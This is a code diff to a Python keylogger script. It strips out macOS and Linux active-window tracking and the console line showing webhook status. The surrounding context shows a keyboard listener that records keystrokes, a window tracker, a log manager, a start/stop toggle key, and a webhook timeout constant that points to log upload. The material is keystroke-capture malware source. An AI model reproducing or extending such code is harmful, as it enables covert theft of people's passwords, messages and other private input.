@@ -25,9 +25,6 @@ except ImportError:
     requests = None  # type: ignore[assignment]
 
 WINDOWS = "Windows"
-DARWIN = "Darwin"
-LINUX = "Linux"
-
 if platform.system() == WINDOWS:
     try:
         import win32gui
@@ -35,11 +32,6 @@ if platform.system() == WINDOWS:
         import psutil
     except ImportError:
         win32gui = None
-elif platform.system() == DARWIN:
-    try:
-        from AppKit import NSWorkspace
-    except ImportError:
-        NSWorkspace = None
 
 BYTES_PER_MB = 1024 * 1024
 WEBHOOK_TIMEOUT_SECS = 5
@@ -121,11 +113,6 @@ class WindowTracker:
 
         if system == WINDOWS and win32gui:
             return WindowTracker._get_windows_window()
-        if system == DARWIN and NSWorkspace:
-            return WindowTracker._get_macos_window()
-        if system == LINUX:
-            return WindowTracker._get_linux_window()
-
         return None
 
 class LogManager:
@@ -354,30 +341,21 @@ class Keylogger:
 
     def start(self) -> None:
         toggle = (self.config.toggle_key.name.upper())
-        webhook_status = (
-            "Enabled" if self.webhook.enabled else "Disabled"
-        )
-
         print("Keylogger Started")
         print()
         print(f"Log Directory: {self.config.log_dir}")
         print(
             "Current Log: "
-            f"{self.log_manager.current_log_path.name}"
-        )
+            f"{self.log_manager.current_log_path.name}")
         print(f"Toggle Key: {toggle}")
-        print(f"Webhook: {webhook_status}")
         print()
         print("[*] Press "
               f"{toggle} to start/stop logging")
         print("[*] Press CTRL+C to exit\n")
-
         self.is_running.set()
         self.is_logging.set()
-
         self.listener = keyboard.Listener(on_press = self._on_press)
         self.listener.start()
-
         try:
             while self.is_running.is_set():
                 self.listener.join(
@@ -400,17 +378,15 @@ class Keylogger:
         print("[*] Logs saved to: "
               f"{self.config.log_dir}")
         print("[*] Keylogger stopped.")
-        
+
+
 def main() -> None:
     keylogger = Keylogger(KeyloggerConfig())
-
     try:
         keylogger.start()
     except Exception as e:
         print(f"\n[!] Error: {e}")
         keylogger.stop()
-
-
 if __name__ == "__main__":
     main()
 
